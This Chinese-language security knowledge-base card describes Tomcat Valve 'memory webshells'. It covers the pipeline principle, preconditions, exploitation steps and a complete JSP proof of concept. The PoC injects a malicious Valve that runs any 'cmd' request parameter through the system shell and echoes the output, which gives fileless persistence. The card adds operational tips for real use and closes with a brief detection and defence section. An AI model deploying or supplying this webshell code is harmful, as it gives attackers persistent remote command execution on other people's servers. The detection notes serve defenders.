---
id: web-java-component-tomcat-valve-memshell
title: Tomcat Valve 内存马：StandardContext Pipeline 注入恶意 Valve
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-valve-memshell
tags:
- java
- tomcat
- memshell
- persistence
- valve
- pipeline
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:36:48+08:00'
  notes: 已对照原文3.3节与图55-60核对：通过ContainerBase.pipeline反射取StandardPipeline，addValve注入ValveBase子类，Valve在Context层Servlet/Filter前执行并读取cmd回显；原文示例仅在cmd分支调用getNext().invoke，卡内已说明并建议把next放到末尾。原文未给组件受影响版本，未设置affected_versions。未复现。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-valve-memshell/
draft: false
kb_aliases:
- Tomcat Valve 内存马
- StandardPipeline addValve
- ContainerBase.pipeline 注入
- ValveBase 内存马
- Tomcat 阀门 WebShell
---

## 一句话结论

在已能执行一次 Java/JSP 代码的 Tomcat 中，取得 `StandardContext` 的 `Pipeline` 并 `addValve()` 一个恶意 `ValveBase`；该 Valve 会在每个请求进入 Context 的 Servlet/Filter 链之前执行，且不经过 Servlet 映射，形成不落文件的 Valve 内存马。

## 原理

- Tomcat 的四种容器（Engine、Host、Context、Wrapper）各自持有一个 `Pipeline`，Pipeline 上挂多个 `Valve`；请求按容器层级依次调用 `pipeline.getFirst().invoke(request, response)`。
- `StandardHostValve.invoke` 中调用 `context.getPipeline().getFirst().invoke(...)`；`StandardEngineValve` 调用 `host.getPipeline().getFirst().invoke(...)`，说明 Valve 在容器层生效，先于 Wrapper 的 Servlet/Filter 处理。
- `StandardContext` 继承自 `ContainerBase`，持有私有 `pipeline` 字段；`getPipeline()` 返回 `StandardPipeline`，其 `addValve(Valve)` 可把恶意 Valve 追加到链上。
- 恶意 Valve 继承 `ValveBase` 并重写 `invoke(Request, Response)`：读取 `cmd` 参数执行命令，把结果写入 `response.getWriter()`。为不阻断业务，正常请求应调用 `getNext().invoke(request, response)`；原文示例在 `cmd` 分支内调用 next，非命令请求可能不再继续，实战中建议把 next 放到方法末尾。
- 因为 Valve 位于 Context 层，只要请求进入该 Context 就会触发，不依赖具体 Servlet 映射，也不受 URL 白名单限制。

## 触发条件

- 目标为 Tomcat，Context 的 Pipeline 使用 `StandardPipeline`；
- 攻击者已能执行一次 Java 代码或 JSP；
- 能通过 `request` 反射取得 `org.apache.catalina.connector.Request`，再 `getContext()` 得到 `StandardContext`；
- 应用未限制访问/修改 `pipeline`。

## 利用步骤

1. 反射 `request` 字段得到 Tomcat `Request`，调用 `getContext()` 取 `StandardContext`。
2. 反射 `ContainerBase.pipeline`（或调用 `getPipeline()`）得到 `StandardPipeline`。
3. 编写恶意 `ValveBase` 子类，在 `invoke` 中执行命令并回显。
4. 调用 `pipeline.addValve(evilValve)`。
5. 访问该 Context 下任意路径携带 `?cmd=...` 验证；后续请求均触发。
6. 删除植入文件不失效，重启应用后清除。

## PoC

```jsp
<%@ page import="java.lang.reflect.Field, java.io.*, java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.*, org.apache.catalina.core.*" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%
  Field rf = request.getClass().getDeclaredField("request");
  rf.setAccessible(true);
  Request req = (Request) rf.get(request);
  StandardContext ctx = (StandardContext) req.getContext();

  Field pf = ContainerBase.class.getDeclaredField("pipeline");
  pf.setAccessible(true);
  StandardPipeline pipeline = (StandardPipeline) pf.get(ctx);

  ValveBase evil = new ValveBase() {
    public void invoke(Request request, Response response) throws IOException, ServletException {
      String cmd = request.getParameter("cmd");
      if (cmd != null) {
        String[] c = System.getProperty("os.name").toLowerCase().contains("win")
            ? new String[]{"cmd.exe", "/c", cmd}
            : new String[]{"/bin/sh", "-c", cmd};
        Process p = Runtime.getRuntime().exec(c);
        Scanner s = new Scanner(p.getInputStream(), "GBK").useDelimiter("\\A");
        response.setCharacterEncoding("GBK");
        response.getWriter().write(s.hasNext() ? s.next() : "");
        response.getWriter().flush();
      }
      getNext().invoke(request, response);
    }
  };
  pipeline.addValve(evil);
  out.print("inject ok");
%>
```

## 变体与关联

- 变体：也可注入到 Engine/Host/Wrapper 的 Pipeline，作用范围分别为全局、虚拟主机、单 Servlet；Context 层最常用。
- 变体：`StandardContext.getPipeline()` 是公开方法，可直接调用，无需反射 `ContainerBase.pipeline`。
- 关联：[[web-java-component-tomcat-filter-memshell]]、[[web-java-component-tomcat-listener-memshell]]（Context 层其它内存马）；[[web-java-component-tomcat-executor-memshell]]（更底层的连接器层）。
- 边界：重启清空；Valve 未调用 `getNext()` 会阻断业务请求；Tomcat 版本/自定义 Pipeline 实现差异可能影响注入。

## 检测与防御

- 检测：运行期 `StandardPipeline` 的 Valve 链中出现非部署包类；请求调用栈在 `StandardHostValve`/`StandardContextValve` 前出现可疑 `invoke`；JSP 中出现 `addValve`、`pipeline`、`ValveBase` 组合。
- 处置：重启应用；用 Arthas/内存 dump 枚举各容器 Pipeline 的 Valve。
- 防御：封堵任意代码执行/JSP 写入；RASP 监控 `addValve`；对容器组件做完整性基线比对。
